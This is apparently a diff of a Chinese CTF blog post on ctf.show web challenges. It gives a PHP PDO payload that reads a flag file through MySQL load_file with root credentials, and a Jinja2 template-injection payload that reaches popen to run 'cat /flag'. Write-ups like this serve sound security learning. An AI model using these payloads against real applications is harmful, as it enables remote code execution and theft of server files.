@@ -1171,7 +1171,7 @@
 <p>用glob函数过</p>
 <p>使用方法：``</p>
 <p>glob(‘./*’)遍历当前目录下的文件</p>
-<h3 id="web-75"><a href="#web-75" class="headerlink" title="web 75"></a>web 75</h3><p>用到了php中保存目录的类：DirectoryIterator</p>
+<h3 id="web-75-76"><a href="#web-75-76" class="headerlink" title="web 75-76"></a>web 75-76</h3><p>用到了php中保存目录的类：Directoryiterator</p>
 <p>DirectoryIterator 类提供了一个简单的界面来查看文件系统目录的内容。</p>
 <p>我们可以直接在网页中编写实例一个DirectoryIterator对象，然后用一个循环遍历出它里面包含的文件</p>
 <p>payload：</p>
@@ -1182,15 +1182,28 @@
 
 <p>所以我们现在需要初始化的内容<code>$dbh = new PDO($dsn, $user, $pass); *//初始化一个PDO对象*</code></p>
 <p>需要提供账号密码还有数据库信息</p>
-<p>不知道师傅们是怎么拿到数据库的信息的：</p>
+<p>也不知道师傅们是怎么拿到数据库的信息的：</p>
 <p>payload：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">try&#123;</span><br><span class="line"><span class="meta">	$</span><span class="bash">dbh = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span></span><br><span class="line"><span class="meta">	foreach($</span><span class="bash">dbh-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>)as <span class="variable">$row</span>)&#123;</span></span><br><span class="line"><span class="meta">		echo($</span><span class="bash">row[0]).<span class="string">&quot;|&quot;</span>;&#125;</span></span><br><span class="line"><span class="meta">		$</span><span class="bash">dbh = NULL;</span></span><br><span class="line">	</span><br><span class="line">&#125;catch (POException $e)&#123;</span><br><span class="line">	echo $e-&gt;getMessage();</span><br><span class="line">	die();	</span><br><span class="line">	&#125;exit();</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">try&#123;</span><br><span class="line"><span class="meta">	$</span><span class="bash">dbh = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span></span><br><span class="line"><span class="meta">	foreach($</span><span class="bash">dbh-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>)as <span class="variable">$row</span>)&#123;<span class="comment">#76是36d</span></span></span><br><span class="line"><span class="meta">		echo($</span><span class="bash">row[0]).<span class="string">&quot;|&quot;</span>;&#125;</span></span><br><span class="line"><span class="meta">		$</span><span class="bash">dbh = NULL;</span></span><br><span class="line">	</span><br><span class="line">&#125;catch (POException $e)&#123;</span><br><span class="line">	echo $e-&gt;getMessage();</span><br><span class="line">	die();	</span><br><span class="line">	&#125;exit();</span><br></pre></td></tr></table></figure>
 
 
 
 <p>c=try {$dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’, ‘root’);foreach($dbh-&gt;query(‘select load_file(“/flag36.txt”)’) as $row) {echo($row[0]).”|”; }$dbh = null;}catch (PDOException $e) {echo $e- &gt;getMessage();<strong>exit</strong>(0);}<strong>exit</strong>(0);</p>
 <p>原理：在数据库中查找flag36.txt然后抛出异常，输出其中内容</p>
-<h3 id="web-76"><a href="#web-76" class="headerlink" title="web 76"></a>web 76</h3>]]></content>
+<h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
+<p>题目的提示：名字就是提示，我们只需要在网页的后面以get方式传入一个值就行了</p>
+<p>既然是ssti那么我们直接测试一下49看一下</p>
+<p>成功返回了49，那就肯定了就是这里。</p>
+<p>那么我们直接开始调用里面的魔术方法</p>
+<p><code>&#39;&#39;.__class__.__mro__</code>可以看到object类在2那么数组就是1，然后我们进去看一看它里面的类</p>
+<p><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()</code>可以看到回显了很多类，我们查找可以执行os命令的类</p>
+<p>找到了在133，那么数组就是132我们直接调用初始化，然后globals全局来查找可以使用的方法及变量参数</p>
+<p>这里面os是空的，继续找，找到popen</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
       <tags>
         <tag>ctf-show</tag>
       </tags>
